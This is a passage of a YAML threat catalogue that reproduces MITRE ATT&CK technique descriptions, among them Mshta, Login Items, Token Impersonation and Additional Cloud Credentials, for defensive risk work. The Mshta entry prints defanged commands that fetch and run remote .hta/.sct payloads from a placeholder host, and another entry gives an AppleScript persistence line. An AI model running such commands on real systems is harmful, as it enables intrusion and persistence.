      communicating with them prior to a compromise. Using common services, such as
      those offered by Google, Microsoft, or Twitter, makes it easier for adversaries
      to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API
      2024) Web service providers commonly use SSL/TLS encryption, giving adversaries
      an added level of protection.


      Use of Web services may also protect back-end C2 infrastructure from discovery
      through malware binary analysis while also enabling operational resiliency (since
      this infrastructure may be dynamically changed).

      https://attack.mitre.org/techniques/T1102'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.001
    ref_id: T1552.001
    name: Credentials In Files
    description: 'Adversaries may search local file systems and remote file shares
      for files containing insecurely stored credentials. These can be files created
      by users to store their own credentials, shared credential stores for a group
      of individuals, configuration files containing passwords for a system or service,
      or source code/binary files containing embedded passwords.


      It is possible to extract passwords from backups or saved virtual machines through
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation:
      CG 2014) Passwords may also be obtained from Group Policy Preferences stored
      on the Windows Domain Controller.(Citation: SRD GPP)


      In cloud and/or containerized environments, authenticated user and service account
      credentials are often stored in local configuration and credential files.(Citation:
      Unit 42 Hildegard Malware) They may also be found as parameters to deployment
      commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some
      cases, these files can be copied and reused on another machine or the contents
      can be read and then used to authenticate without needing to copy any files.(Citation:
      Specter Ops - Cloud Credential Storage)

      https://attack.mitre.org/techniques/T1552/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.003
    ref_id: T1568.003
    name: DNS Calculation
    description: 'Adversaries may perform calculations on addresses returned in DNS
      results to determine which port and IP address to use for command and control,
      rather than relying on a predetermined port number or the actual returned IP
      address. A IP and/or port number calculation can be used to bypass egress filtering
      on a C2 channel.(Citation: Meyers Numbered Panda)


      One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003)
      is to take the first three octets of an IP address in a DNS response and use
      those values to calculate the port for command and control traffic.(Citation:
      Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)

      https://attack.mitre.org/techniques/T1568/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.005
    ref_id: T1218.005
    name: Mshta
    description: "Adversaries may abuse mshta.exe to proxy execution of malicious\
      \ .hta files and Javascript or VBScript through a trusted Windows utility. There\
      \ are several examples of different types of threats leveraging mshta.exe during\
      \ initial compromise and for execution of code (Citation: Cylance Dust Storm)\
      \ (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging\
      \ HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April\
      \ 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications\
      \ (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications\
      \ that execute using the same models and technologies of Internet Explorer,\
      \ but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may\
      \ be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"\
      GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey\
      \ may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\
      \nMshta.exe can be used to bypass application control solutions that do not\
      \ account for its potential use. Since mshta.exe executes outside of the Internet\
      \ Explorer's security context, it also bypasses browser security settings. (Citation:\
      \ LOLBAS Mshta)\nhttps://attack.mitre.org/techniques/T1218/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.015
    ref_id: T1547.015
    name: Login Items
    description: "Adversaries may add login items to execute upon user login to gain\
      \ persistence or escalate privileges. Login items are applications, documents,\
      \ folders, or server connections that are automatically launched when a user\
      \ logs in.(Citation: Open Login Items Apple) Login items can be added via a\
      \ shared file list or Service Management Framework.(Citation: Adding Login Items)\
      \ Shared file list login items can be set using scripting languages such as\
      \ [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the\
      \ Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\
      \nLogin items installed using the Service Management Framework leverage <code>launchd</code>,\
      \ are not visible in the System Preferences, and can only be removed by the\
      \ application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled\
      \ Schroeder 2013) Login items created using a shared file list are visible in\
      \ System Preferences, can hide the application when it launches, and are executed\
      \ through LaunchServices, not launchd, to open applications, documents, or URLs\
      \ without using Finder.(Citation: Launch Services Apple Developer) Users and\
      \ applications use login items to configure their user environment to launch\
      \ commonly used services or applications, such as email, chat, and music applications.\n\
      \nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ and [Native API](https://attack.mitre.org/techniques/T1106) calls to create\
      \ a login item to spawn malicious executables.(Citation: ELC Running at startup)\
      \ Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002)\
      \ to send an Apple events to the \u201CSystem Events\u201D process, which has\
      \ an AppleScript dictionary for manipulating login items.(Citation: Login Items\
      \ AE) Adversaries can use a command such as <code>tell application \u201CSystem\
      \ Events\u201D to make login item at end with properties /path/to/executable</code>.(Citation:\
      \ Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add\
      \ List Remove Login Items Apple Script) This command adds the path of the malicious\
      \ executable to the login item file list located in <code>~/Library/Application\
      \ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation:\
      \ Startup Items Eclectic) Adversaries can also use login items to launch executables\
      \ that can be used to control the victim system remotely or as a means to gain\
      \ privilege escalation by prompting for user credentials.(Citation: objsee mac\
      \ malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor\
      \ 2019)\nhttps://attack.mitre.org/techniques/T1547/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608
    ref_id: T1608
    name: Stage Capabilities
    description: 'Adversaries may upload, install, or otherwise set up capabilities
      that can be used during targeting. To support their operations, an adversary
      may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587))
      or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588))
      and stage them on infrastructure under their control. These capabilities may
      be staged on infrastructure that was previously purchased/rented by the adversary
      ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was
      otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).
      Capabilities may also be staged on web services, such as GitHub or Pastebin,
      or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision
      applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos
      Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope
      GCP Redirection)(Citation: Netskope Cloud Phishing)


      Staging of capabilities can aid the adversary in a number of initial access
      and post-compromise behaviors, including (but not limited to):


      * Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
      when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation:
      Gallagher 2015)(Citation: ATT ScanBox)

      * Staging web resources for a link target to be used with spearphishing.(Citation:
      Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September
      2019)

      * Uploading malware or tools to a location accessible to a victim network to
      enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation:
      Volexity Ocean Lotus November 2020)

      * Installing a previously acquired SSL/TLS certificate to use to encrypt command
      and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation:
      DigiCert Install SSL Cert)

      https://attack.mitre.org/techniques/T1608'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.005
    ref_id: T1608.005
    name: Link Target
    description: "Adversaries may put in place resources that are referenced by a\
      \ link that can be used during targeting. An adversary may rely upon a user\
      \ clicking a malicious link in order to divulge information (including credentials)\
      \ or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001).\
      \ Links can be used for spearphishing, such as sending an email accompanied\
      \ by social engineering text to coax the user to actively click or copy and\
      \ paste a URL into a browser. Prior to a phish for information (as in [Spearphishing\
      \ Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial\
      \ access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)),\
      \ an adversary must set up the resources for a link target for the spearphishing\
      \ link. \n\nTypically, the resources for a link target will be an HTML page\
      \ that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007)\
      \ to decide what content to serve to the user. Adversaries may clone legitimate\
      \ sites to serve as the link target, this can include cloning of login pages\
      \ of legitimate web services or organization login pages in an effort to harvest\
      \ credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation:\
      \ Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September\
      \ 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001)\
      \ and have the link target point to malware for download/execution by the user.\n\
      \nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs,\
      \ typosquatting, different top-level domain, etc.) during acquisition of infrastructure\
      \ ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate\
      \ [Malicious Link](https://attack.mitre.org/techniques/T1204/001).\n\nLinks\
      \ can be written by adversaries to mask the true destination in order to deceive\
      \ victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation:\
      \ Kaspersky-masking)(Citation: mandiant-masking)\n\nAdversaries may also use\
      \ free or paid accounts on link shortening services and Platform-as-a-Service\
      \ providers to host link targets while taking advantage of the widely trusted\
      \ domains of those providers to avoid being blocked while redirecting victims\
      \ to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope\
      \ Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect)\
      \ In addition, adversaries may serve a variety of malicious links through uniquely\
      \ generated URIs/URLs (including one-time, single use links).(Citation: iOS\
      \ URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally,\
      \ adversaries may take advantage of the decentralized nature of the InterPlanetary\
      \ File System (IPFS) to host link targets that are difficult to remove.(Citation:\
      \ Talos IPFS 2022)\nhttps://attack.mitre.org/techniques/T1608/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1104
    ref_id: T1104
    name: Multi-Stage Channels
    description: 'Adversaries may create multiple stages for command and control that
      are employed under different conditions or for certain functions. Use of multiple
      stages may obfuscate the command and control channel to make detection more
      difficult.


      Remote access tools will call back to the first-stage command and control server
      for instructions. The first stage may have automated capabilities to collect
      basic host information, update tools, and upload additional files. A second
      remote access tool (RAT) could be uploaded at that point to redirect the host
      to the second-stage command and control server. The second stage will likely
      be more fully featured and allow the adversary to interact with the system through
      a reverse shell and additional RAT features.


      The different stages will likely be hosted separately with no overlapping infrastructure.
      The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008)
      in case the original first-stage communication path is discovered and blocked.

      https://attack.mitre.org/techniques/T1104'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1657
    ref_id: T1657
    name: Financial Theft
    description: "Adversaries may steal monetary resources from targets through extortion,\
      \ social engineering, technical theft, or other methods aimed at their own financial\
      \ gain at the expense of the availability of these resources for victims. Financial\
      \ theft is the ultimate objective of several popular campaign types including\
      \ extortion by ransomware,(Citation: FBI-ransomware) business email compromise\
      \ (BEC) and fraud,(Citation: FBI-BEC) \"pig butchering,\"(Citation: wired-pig\
      \ butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency\
      \ networks.(Citation: BBC-Ronin) \n\nAdversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586)\
      \ to conduct unauthorized transfers of funds.(Citation: Internet crime report\
      \ 2022) In the case of business email compromise or email fraud, an adversary\
      \ may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of\
      \ a trusted entity. Once the social engineering is successful, victims can be\
      \ deceived into sending money to financial accounts controlled by an adversary.(Citation:\
      \ FBI-BEC) This creates the potential for multiple victims (i.e., compromised\
      \ accounts as well as the ultimate monetary loss) in incidents involving financial\
      \ theft.(Citation: VEC)\n\nExtortion by ransomware may occur, for example, when\
      \ an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)\
      \ (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010)\
      \ of data, followed by threatening to leak sensitive data to the public unless\
      \ payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may\
      \ use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)\n\
      \nDue to the potentially immense business impact of financial theft, an adversary\
      \ may abuse the possibility of financial theft and seeking monetary gain to\
      \ divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485)\
      \ and business disruption.(Citation: AP-NotPetya)\nhttps://attack.mitre.org/techniques/T1657"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480
    ref_id: T1480
    name: Execution Guardrails
    description: "Adversaries may use execution guardrails to constrain execution\
      \ or actions based on adversary supplied and environment specific conditions\
      \ that are expected to be present on the target. Guardrails ensure that a payload\
      \ only executes against an intended target and reduces collateral damage from\
      \ an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values\
      \ an adversary can provide about a target system or environment to use as guardrails\
      \ may include specific network share names, attached physical devices, files,\
      \ joined Active Directory (AD) domains, and local/external IP addresses.(Citation:\
      \ FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of\
      \ capabilities in environments that are not intended to be compromised or operated\
      \ within. This use of guardrails is distinct from typical [Virtualization/Sandbox\
      \ Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox\
      \ Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for\
      \ known sandbox values and continuing with execution only if there is no match,\
      \ the use of guardrails will involve checking for an expected target-specific\
      \ value and only continuing with execution if there is such a match.\n\nAdversaries\
      \ may identify and block certain user-agents to evade defenses and narrow the\
      \ scope of their attack to victims and platforms on which it will be most effective.\
      \ A user-agent self-identifies data such as a user's software application, operating\
      \ system, vendor, and version. Adversaries may check user-agents for operating\
      \ system identification and then only serve malware for the exploitable software\
      \ while ignoring all other operating systems.(Citation: Trellix-Qakbot)\nhttps://attack.mitre.org/techniques/T1480"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1619
    ref_id: T1619
    name: Cloud Storage Object Discovery
    description: 'Adversaries may enumerate objects in cloud storage infrastructure.
      Adversaries may use this information during automated discovery to shape follow-on
      behaviors, including requesting all or specific objects from cloud storage.  Similar
      to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)
      on a local host, after identifying available storage services (i.e. [Cloud Infrastructure
      Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access
      the contents/objects stored in cloud infrastructure.


      Cloud service providers offer APIs allowing users to enumerate objects stored
      within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2)
      and List Blobs in Azure(Citation: List Blobs) .

      https://attack.mitre.org/techniques/T1619'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1606.001
    ref_id: T1606.001
    name: Web Cookies
    description: 'Adversaries may forge web cookies that can be used to gain access
      to web applications or Internet services. Web applications and services (hosted
      in cloud SaaS environments or on-premise servers) often use session cookies
      to authenticate and authorize user access.


      Adversaries may generate these cookies in order to gain access to web resources.
      This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)
      and other similar behaviors in that the cookies are new and forged by the adversary,
      rather than stolen or intercepted from legitimate users. Most common web applications
      have standardized and documented cookie values that can be generated using provided
      tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies
      often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004),
      or other cryptographic seed values.


      Once forged, adversaries may use these web cookies to access resources ([Web
      Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass
      multi-factor and other authentication protection mechanisms.(Citation: Volexity
      SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies
      January 2019)

      https://attack.mitre.org/techniques/T1606/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1654
    ref_id: T1654
    name: Log Enumeration
    description: "Adversaries may enumerate system and service logs to find useful\
      \ data. These logs may highlight various types of valuable insights for an adversary,\
      \ such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)),\
      \ security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)),\
      \ or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).\n\
      \nHost binaries may be leveraged to collect system logs. Examples include using\
      \ `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ on Windows to access and/or export security event information.(Citation: WithSecure\
      \ Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges\
      \ as novel threat actor) In cloud environments, adversaries may leverage utilities\
      \ such as the Azure VM Agent\u2019s `CollectGuestLogs.exe` to collect security\
      \ logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of\
      \ the Microsoft Azure Serial Console)\n\nAdversaries may also target centralized\
      \ logging infrastructure such as SIEMs. Logs may also be bulk exported and sent\
      \ to adversary-controlled infrastructure for offline analysis.\n\nIn addition\
      \ to gaining a better understanding of the environment, adversaries may also\
      \ monitor logs in real time to track incident response procedures. This may\
      \ allow them to adjust their techniques in order to maintain persistence or\
      \ evade defenses.(Citation: Permiso GUI-Vil 2023)\nhttps://attack.mitre.org/techniques/T1654"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.001
    ref_id: T1134.001
    name: Token Impersonation/Theft
    description: 'Adversaries may duplicate then impersonate another user''s existing
      token to escalate privileges and bypass access controls. For example, an adversary
      can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation:
      DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser`
      to allow the calling thread to impersonate a logged on user''s security context,
      or with `SetThreadToken` to assign the impersonated token to a thread.


      An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      when they have a specific, existing process they want to assign the duplicated
      token to. For example, this may be useful for when the target user has a non-network
      logon session on the system.


      When an adversary would instead use a duplicated token to create a new process
      rather than attaching to an existing process, they can additionally [Create
      Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW`
      or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)
      in that it refers to duplicating an existing token, rather than creating a new
      one.

      https://attack.mitre.org/techniques/T1134/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.001
    ref_id: T1567.001
    name: Exfiltration to Code Repository
    description: 'Adversaries may exfiltrate data to a code repository rather than
      over their primary command and control channel. Code repositories are often
      accessible via an API (ex: https://api.github.com). Access to these APIs are
      often over HTTPS, which gives the adversary an additional level of protection.


      Exfiltration to a code repository can also provide a significant amount of cover
      to the adversary if it is a popular service already used by hosts within the
      network.

      https://attack.mitre.org/techniques/T1567/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.007
    ref_id: T1021.007
    name: Cloud Services
    description: "Adversaries may log into accessible cloud services within a compromised\
      \ environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ that are synchronized with or federated to on-premises user identities. The\
      \ adversary may then perform management actions or access cloud-hosted resources\
      \ as the logged-on user. \n\nMany enterprises federate centrally managed user\
      \ identities to cloud services, allowing users to login with their domain credentials\
      \ in order to access the cloud control plane. Similarly, adversaries may connect\
      \ to available cloud services through the web console or through the cloud command\
      \ line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)),\
      \ using commands such as <code>Connect-AZAccount</code> for Azure PowerShell,\
      \ <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud\
      \ auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries\
      \ may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001)\
      \ instead of a username and password.\nhttps://attack.mitre.org/techniques/T1021/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1205.001
    ref_id: T1205.001
    name: Port Knocking
    description: 'Adversaries may use port knocking to hide open ports used for persistence
      or command and control. To enable a port, an adversary sends a series of attempted
      connections to a predefined sequence of closed ports. After the sequence is
      completed, opening a port is often accomplished by the host based firewall,
      but could also be implemented by custom software.


      This technique has been observed both for the dynamic opening of a listening
      port as well as the initiating of a connection to a listening server on a different
      system.


      The observation of the signal packets to trigger the communication can be conducted
      through different methods. One means, originally implemented by Cd00r (Citation:
      Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets
      in question. Another method leverages raw sockets, which enables the malware
      to use ports that are already open for use by other programs.

      https://attack.mitre.org/techniques/T1205/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.012
    ref_id: T1027.012
    name: LNK Icon Smuggling
    description: "Adversaries may smuggle commands to download malicious payloads\
      \ past content filters by hiding them within otherwise seemingly benign windows\
      \ shortcut files. Windows shortcut files (.LNK) include many metadata fields,\
      \ including an icon location field (also known as the `IconEnvironmentDataBlock`)\
      \ designed to specify the path to an icon file that is to be displayed for the\
      \ LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata\
      \ to download malicious payloads. For example, adversaries have been observed\
      \ using LNK files as phishing payloads to deliver malware. Once invoked (e.g.,\
      \ [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads\
      \ referenced via external URLs within the LNK icon location field may be downloaded.\
      \ These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System\
      \ Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments\
      \ within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation:\
      \ Booby Trap Shortcut 2017)\n\nLNK Icon Smuggling may also be utilized post\
      \ compromise, such as malicious scripts executing an LNK on an infected host\
      \ to download additional malicious payloads.\nhttps://attack.mitre.org/techniques/T1027/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.006
    ref_id: T1583.006
    name: Web Services
    description: "Adversaries may register for web services\_that can be used during\
      \ targeting. A variety of popular websites exist for adversaries to register\
      \ for a web-based service that can be abused during later stages of the adversary\
      \ lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)),\
      \ [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567),\
      \ or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services,\
      \ such as those offered by Google or Twitter, makes it easier for adversaries\
      \ to hide in expected noise.(Citation: FireEye APT29) By utilizing a web service,\
      \ adversaries can make it difficult to physically tie back operations to them.\n\
      https://attack.mitre.org/techniques/T1583/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1528
    ref_id: T1528
    name: Steal Application Access Token
    description: "Adversaries can steal application access tokens as a means of acquiring\
      \ credentials to access remote systems and resources.\n\nApplication access\
      \ tokens are used to make authorized API requests on behalf of a user or service\
      \ and are commonly used as a way to access resources in cloud and container-based\
      \ applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should\
      \ Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal\
      \ account API tokens in cloud and containerized environments may be able to\
      \ access data and perform actions with the permissions of these accounts, which\
      \ can lead to privilege escalation and further compromise of the environment.\n\
      \nFor example, in Kubernetes environments, processes running inside a container\
      \ may communicate with the Kubernetes API server using service account tokens.\
      \ If a container is compromised, an adversary may be able to steal the container\u2019\
      s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes\
      \ Service Accounts)  Similarly, instances within continuous-development / continuous-integration\
      \ (CI/CD) pipelines will often use API tokens to authenticate to other services\
      \ for testing and deployment.(Citation: Cider Security Top 10 CICD Security\
      \ Risks) If these pipelines are compromised, adversaries may be able to steal\
      \ these tokens and leverage their privileges.\n\nToken theft can also occur\
      \ through social engineering, in which case user action may be required to grant\
      \ access. OAuth is one commonly implemented framework that issues tokens to\
      \ users for access to systems. An application desiring access to cloud-based\
      \ services or protected APIs can gain entry using OAuth 2.0 through a variety\
      \ of authorization protocols. An example commonly-used sequence is Microsoft's\
      \ Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols\
      \ May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019)\
      \ An OAuth access token enables a third-party application to interact with resources\
      \ containing user data in the ways requested by the application without obtaining\
      \ user credentials. \n \nAdversaries can leverage OAuth authorization by constructing\
      \ a malicious application designed to be granted access to resources with the\
      \ target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August\
      \ 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need\
      \ to complete registration of their application with the authorization server,\
      \ for example Microsoft Identity Platform using Azure Portal, the Visual Studio\
      \ IDE, the command-line interface, PowerShell, or REST API calls.(Citation:\
      \ Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing\
      \ Link](https://attack.mitre.org/techniques/T1566/002) to the target user to\
      \ entice them to grant access to the application. Once the OAuth access token\
      \ is granted, the application can gain potentially long-term access to features\
      \ of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation:\
      \ Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens\
      \ may function within a limited lifetime, limiting how long an adversary can\
      \ utilize the stolen token. However, in some cases, adversaries can also steal\
      \ application refresh tokens(Citation: Auth0 Understanding Refresh Tokens),\
      \ allowing them to obtain new access tokens without prompting the user.\nhttps://attack.mitre.org/techniques/T1528"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.002
    ref_id: T1598.002
    name: Spearphishing Attachment
    description: 'Adversaries may send spearphishing messages with a malicious attachment
      to elicit sensitive information that can be used during targeting. Spearphishing
      for information is an attempt to trick targets into divulging information, frequently
      credentials or other actionable information. Spearphishing for information frequently
      involves social engineering techniques, such as posing as a source with a reason
      to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or
      sending multiple, seemingly urgent messages.


      All forms of spearphishing are electronically delivered social engineering targeted
      at a specific individual, company, or industry. In this scenario, adversaries
      attach a file to the spearphishing email and usually rely upon the recipient
      populating information then returning the file.(Citation: Sophos Attachment)(Citation:
      GitHub Phishery) The text of the spearphishing email usually tries to give a
      plausible reason why the file should be filled-in, such as a request for information
      from a business associate. Adversaries may also use information from previous
      reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))
      to craft persuasive and believable lures.

      https://attack.mitre.org/techniques/T1598/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.001
    ref_id: T1098.001
    name: Additional Cloud Credentials
    description: "Adversaries may add adversary-controlled credentials to a cloud\
      \ account to maintain persistent access to victim accounts and instances within\
      \ the environment.\n\nFor example, adversaries may add credentials for Service\
      \ Principals and Applications in addition to existing legitimate credentials\
      \ in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:\
      \ Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials\
      \ include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer\
      \ Guidance) With sufficient permissions, there are a variety of ways to add\
      \ credentials including the Azure Portal, Azure command line interface, and\
      \ Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\
      \nIn infrastructure-as-a-service (IaaS) environments, after gaining access through\
      \ [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries\
      \ may generate or import their own SSH keys using either the <code>CreateKeyPair</code>\
      \ or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login\
      \ ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows\
      \ persistent access to instances within the cloud environment without further\
      \ usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:\
      \ Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>\
      \ API in AWS or the <code>gcloud iam service-accounts keys create</code> command\
      \ in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>\
      \ API in AWS to add a password that can be used to log into the AWS Management\
      \ Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:\
      \ Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)\
      \ If the target account has different permissions from the requesting account,\
      \ the adversary may also be able to escalate their privileges in the environment\
      \ (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel\
      \ 2.0) For example, in Entra ID environments, an adversary with the Application\
      \ Administrator role can add a new set of credentials to their application's\
      \ service principal. In doing so the adversary would be able to access the service\
      \ principal\u2019s roles and permissions, which may be different from those\
      \ of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)\
      \ \n\nIn AWS environments, adversaries with the appropriate permissions may\
      \ also use the `sts:GetFederationToken` API call to create a temporary set of\
      \ credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)\
      \ tied to the permissions of the original user account. These temporary credentials\
      \ may remain valid for the duration of their lifetime even if the original account\u2019\
      s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation\
      \ Persistence)\n\nIn Entra ID environments with the app password feature enabled,\
      \ adversaries may be able to add an app password to a user account.(Citation:\
      \ Mandiant APT42 Operations 2024) As app passwords are intended to be used with\
      \ legacy devices that do not support multi-factor authentication (MFA), adding\
      \ an app password can allow an adversary to bypass MFA requirements. Additionally,\
      \ app passwords may remain valid even if the user\u2019s primary password is\
      \ reset.(Citation: Microsoft Entra ID App Passwords)\nhttps://attack.mitre.org/techniques/T1098/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204
    ref_id: T1204
    name: User Execution
    description: 'An adversary may rely upon specific actions by a user in order to
